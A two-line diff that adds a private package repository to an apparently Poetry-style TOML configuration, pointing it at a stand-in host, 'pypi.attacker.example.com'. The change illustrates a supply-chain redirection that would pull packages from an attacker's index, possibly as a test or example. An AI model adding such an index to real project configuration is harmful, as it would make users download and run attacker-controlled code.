@@ -1,0 +1,2 @@
+[repositories.private]
+url = "https://pypi.attacker.example.com/simple"
